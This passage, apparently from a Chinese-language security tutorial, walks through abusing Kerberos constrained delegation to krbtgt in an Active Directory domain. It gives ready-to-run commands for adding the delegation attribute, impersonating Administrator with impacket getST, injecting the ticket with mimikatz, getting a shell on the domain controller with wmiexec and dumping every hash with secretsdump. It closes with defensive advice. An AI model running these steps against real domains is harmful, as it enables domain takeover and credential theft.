+<p><strong>注</strong>：<code>TGS</code>默认的spn是<code>krbtgt/domain name</code>，我们操作环境是<code>krbtgt/QIYOU.COM</code></p>
+<p><code>krbtgt</code>默认是禁用的而且无法启用，所以我们无法使用界面来添加这个SPN。</p>
+<p>我们可以使用powershell来添加</p>
+<pre><code>Import-Module ActiveDirectory
+$user = Get-ADUser qiyou
+Set-ADObject $user -Add @{ "msDS-AllowedToDelegateTo" = @("krbtgt/qiyou.com") }</code></pre>
+<p><strong>注</strong>：域控默认安装ActiveDirectory，如果没有安装，可以下载dll：<a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll" target="_blank">下载地址</a>，然后导入就行了：<code>import-module .\Microsoft.ActiveDirectory.Management.dll</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208201546-bc68548e-4a6c-1.png"/></p>
+<p>GUI界面查看一下，成功添加</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208201626-d4453568-4a6c-1.png"/></p>
+<p>我们可以用<code>impacket</code>系列的<code>getST</code>向KDC请求administrator的TGT</p>
+<pre><code>getst.exe -dc-ip 192.168.141.145 -spn krbtgt/qiyou.com -impersonate Administrator qiyou.com/qiyou:password</code></pre>
+<p>参数：</p>
+<p>-impersonate：表示伪造用户</p>
+<p>-spn：表示我们要委派的服务的spn，这里是TGS</p>
+<p>-dc-ip：域控ip</p>
+<p>执行之后会在当前目录生成一个缓存文件<code>Administrator.ccache</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208211804-70145b4c-4a75-1.png"/></p>
+<p>然后用mimikatz进行<code>ptc</code>（pass the cache），将缓存注入当前会话中</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208212218-07ca043c-4a76-1.png"/></p>
+<p>klist查看缓存的票据</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208212405-47a4808c-4a76-1.png"/></p>
+<p>访问域控</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208212458-6714dfb6-4a76-1.png"/></p>
+<p>执行命令的话我们可以用<code>impacket</code>系列或者<code>powershell</code>都可以</p>
+<p>wmiexec</p>
+<pre><code>set KRB5CCNAME=Administrator.ccache
+
+wmiexec.exe -no-pass -k administrator@WIN-QFPHJSM1L7G.qiyou.com -dc-ip 192.168.141.145</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200208212926-06b9b3f2-4a77-1.png"/></p>
+<p>导出域控上所有用户以及主机的hash</p>
+<pre><code>set KRB5CCNAME=Administrator.ccache
+
+secretsdump.exe -no-pass -k WIN-QFPHJSM1L7G.qiyou.com</code></pre>
+<p>请求过程和上面的cifs是一样的只不过是把cifs换krbtgt而已，所以这里就不抓包演示了</p>
+<h2 data-content="1" id="5f53985c094867c24d0ad77f0b646af1">防御</h2>
+<ol>
+<li>高权限用户没有在特殊要求之下设置为不可委派</li>
+</ol>
+<p>如图</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211095642-c04916c2-4c71-1.png"/></p>
+<ol>
+<li>为了防止凭据被盗微软推出了<code>Protected Users</code>组，适用于<code>Windows Server 2016</code>，<code>Windows Server 2012 R2</code>、 <code>Windows Server 2012</code>
+</li>
+</ol>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200211100913-7fa14af2-4c73-1.png"/></p>
+<p>关于<code>Protected Users</code>组成员的特点请参考微软<a href="https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts#BKMK_AddtoProtectedUsers" target="_blank">手册</a>，这里就不多赘述了</p>
+<ol>
+<li>提高服务用户密码强度，防止黑客通过<code>Kerberoasting</code>等手段对口令进行暴力破解</li>
+</ol>
+<h2 data-content="1" id="fa008d25119fd27737144a8b0f91672c">Reference</h2>
+<p><a href="http://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/" target="_blank">http://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/</a></p>
+<p><a href="https://paper.seebug.org/620/" target="_blank">https://paper.seebug.org/620/</a></p>
+<p><a href="https://horizon.guidepointsecurity.com/tutorials/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/" target="_blank">https://horizon.guidepointsecurity.com/tutorials/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/</a></p>
+<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/1fb9caca-449f-4183-8f7a-1a5fc7e7290a?redirectedfrom=MSDN" target="_blank">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/1fb9caca-449f-4183-8f7a-1a5fc7e7290a?redirectedfrom=MSDN</a></p>
+</div>
+</div>
